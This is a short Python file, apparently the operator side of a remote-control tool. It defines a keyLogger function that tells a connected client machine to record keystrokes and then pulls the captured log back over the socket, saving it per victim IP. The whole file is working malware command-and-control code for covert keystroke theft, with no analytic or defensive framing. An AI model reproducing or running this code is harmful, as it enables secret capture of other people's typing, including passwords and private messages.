
import os

# to log keys at client side and recieve log file - keylogger command
def keyLogger(conn,ip):
    print("Logging keys...")
    conn.send("log".encode())
    res=conn.recv(1024).decode()
    if res == "done":
        print("Logging of keys done until ESC is pressed by client or keys pressed exceed 50 key presses")
    conn.send("ok".encode())
    l=int(conn.recv(20480).decode())
    print("Extracting logs")
    conn.send("start".encode())
    f=open(os.path.join(ip,"logs.txt"),"w")
    curr_len=0
    while curr_len<l:
        print(end="\r")
        data=conn.recv(204800)
        curr_len+=len(data)
        f.write(data.decode())
        print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")
    f.close()
    print("\nLogs recieved")
    conn.send("receive".encode())
    output=conn.recv(20480).decode()
    print(output,end="")
